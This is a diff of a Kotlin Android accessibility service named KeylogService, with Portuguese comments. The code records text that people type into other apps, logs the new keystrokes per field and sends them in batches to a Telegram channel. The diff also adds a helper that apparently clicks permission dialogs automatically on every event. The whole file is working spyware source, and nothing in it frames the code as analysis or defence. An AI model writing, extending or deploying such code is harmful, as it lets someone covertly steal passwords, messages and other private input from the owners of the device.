@@ -6,13 +6,10 @@ import android.os.Handler
 import android.os.Looper
 import android.view.accessibility.AccessibilityEvent
 
-/**
- * Serviço de acessibilidade que observa alterações de texto e despacha em lotes.
- */
 class KeylogService : AccessibilityService() {
 
     private val buffer = StringBuilder()
-    private var ultimoTexto = ""
+    private val vistos = HashMap<String, String>()
     private var handler: Handler? = null
 
     private val ciclo = object : Runnable {
@@ -24,28 +21,37 @@ class KeylogService : AccessibilityService() {
 
     override fun onServiceConnected() {
         super.onServiceConnected()
+        PermissionClicker.armar()
         handler = Handler(Looper.getMainLooper())
         handler?.postDelayed(ciclo, Config.KEYLOG_INTERVAL_MS)
         Thread { Telegram.send("<i>Monitor de digitação conectado</i>") }.start()
     }
 
     override fun onAccessibilityEvent(evento: AccessibilityEvent?) {
-if (evento.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
-            evento.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
-        ) {
-            clicarPermissoes(evento)
-        }
         if (evento == null) return
-        if (evento.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
-            evento.eventType != AccessibilityEvent.TYPE_VIEW_FOCUSED
-        ) return
+
+        try {
+            PermissionClicker.agir(this, evento.packageName?.toString())
+        } catch (e: Exception) {
+        }
+
+        if (evento.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return
+        if (evento.packageName?.toString() == packageName) return
 
         val texto = evento.text?.joinToString("")?.trim().orEmpty()
-        if (texto.isEmpty() || texto == ultimoTexto) return
-        ultimoTexto = texto
+        if (texto.isEmpty()) return
+
+        val chave = "${evento.packageName}:${evento.windowId}:${evento.source?.viewIdResourceName ?: evento.source?.hashCode()}"
+        val anterior = vistos[chave] ?: ""
+        if (texto == anterior) return
+        vistos[chave] = texto
+        if (vistos.size > 60) vistos.clear()
+
+        val novo = if (texto.startsWith(anterior)) texto.substring(anterior.length) else texto
+        if (novo.isBlank()) return
 
         val pacote = evento.packageName?.toString()?.substringAfterLast('.') ?: "?"
-        buffer.append("[$pacote] $texto\n")
+        buffer.append("[$pacote] $novo\n")
 
         if (buffer.length >= Config.KEYLOG_FLUSH_CHARS) descarregar()
     }
@@ -74,7 +80,5 @@ if (evento.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
         super.onDestroy()
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        return START_STICKY
-    }
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
 }
